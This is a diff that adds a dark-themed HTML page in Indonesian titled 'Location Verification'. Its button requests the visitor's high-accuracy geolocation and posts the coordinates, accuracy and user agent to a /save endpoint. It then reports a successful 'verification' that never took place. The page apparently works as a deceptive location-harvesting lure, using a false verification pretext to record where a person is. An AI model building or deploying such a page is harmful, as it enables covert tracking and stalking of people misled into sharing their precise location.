@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Location Access</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: #111;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    .card {
+      background: #1e1e1e;
+      border-radius: 20px;
+      padding: 40px 30px;
+      max-width: 400px;
+      width: 100%;
+      text-align: center;
+      box-shadow: 0 10px 40px rgba(0,0,0,0.4);
+    }
+
+    .icon { font-size: 60px; margin-bottom: 20px; }
+
+    h1 {
+      font-size: 22px;
+      color: white;
+      margin-bottom: 10px;
+    }
+
+    p {
+      color: #aaa;
+      font-size: 14px;
+      line-height: 1.6;
+      margin-bottom: 30px;
+    }
+
+    button {
+      width: 100%;
+      padding: 16px;
+      background: #4f46e5;
+      color: white;
+      border: none;
+      border-radius: 12px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    button:disabled { background: #333; color: #666; }
+
+    #status {
+      margin-top: 20px;
+      font-size: 13px;
+      color: #888;
+      min-height: 20px;
+    }
+
+    .success { color: #22c55e !important; font-weight: 600; }
+    .error { color: #ef4444 !important; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="icon">📍</div>
+    <h1>Location Verification</h1>
+    <p>Halaman ini membutuhkan izin lokasi untuk melanjutkan.</p>
+
+    <button onclick="getLocation()" id="btn">Izinkan Lokasi</button>
+    <p id="status"></p>
+  </div>
+
+  <script>
+    async function getLocation() {
+      const status = document.getElementById("status");
+      const btn = document.getElementById("btn");
+
+      btn.disabled = true;
+      btn.textContent = "Meminta izin...";
+      status.innerHTML = "⏳ Menunggu izin lokasi...";
+
+      navigator.geolocation.getCurrentPosition(
+        async (pos) => {
+          const data = {
+            latitude: pos.coords.latitude,
+            longitude: pos.coords.longitude,
+            accuracy: pos.coords.accuracy,
+            userAgent: navigator.userAgent
+          };
+
+          await fetch("/save", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(data)
+          });
+
+          status.innerHTML = "✅ Verifikasi berhasil.";
+          status.className = "success";
+          btn.textContent = "Selesai";
+        },
+        (err) => {
+          status.innerHTML = "❌ Izin lokasi ditolak.";
+          status.className = "error";
+          btn.disabled = false;
+          btn.textContent = "Coba Lagi";
+        },
+        { enableHighAccuracy: true, timeout: 10000 }
+      );
+    }
+  </script>
+</body>
+</html>
